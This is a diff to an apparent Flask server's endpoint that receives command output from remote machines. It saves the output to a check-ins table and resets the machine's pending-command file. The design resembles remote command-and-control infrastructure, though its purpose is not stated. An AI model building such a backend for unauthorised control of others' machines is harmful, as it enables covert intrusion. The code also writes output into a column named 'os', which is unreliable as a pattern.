@@ -147,29 +147,30 @@ def send_command():
 
 @app.route('/mailbox/<mailbox_id>/output', methods=['POST'])
 def receive_output(mailbox_id):
-    if not db_url:
-        return "Database not configured.", 500
-
     data = request.get_json()
-    execution_output = data.get("output", "")
+    command_output = data.get('output', '')
 
-    # Save the output to your database using psycopg2
+    if not db_url:
+        return jsonify({"status": "error", "message": "No DB configured"}), 500
+
+    # Save the output directly into the database row for this machine!
     conn = get_db_connection()
     cursor = conn.cursor()
-    
-    # Note: Make sure your table has a column for 'output'. 
-    # Adjust the table name ('checkins' or 'commands') to match your schema.
     cursor.execute('''
         UPDATE checkins 
         SET os = %s 
         WHERE machine_id = %s
-    ''', (execution_output, mailbox_id))
+    ''', (command_output, mailbox_id))
     
     conn.commit()
     cursor.close()
     conn.close()
-    
-    return {"status": "success"}, 200
+
+    # Create a blank temporary file just to clear out the current command file
+    with open(f"mailbox_{mailbox_id}.txt", "w") as file:
+        file.write("NONE\n")
+
+    return jsonify({"status": "success"})
 
 @app.route('/get_output/<mailbox_id>', methods=['GET'])
 def get_output(mailbox_id):
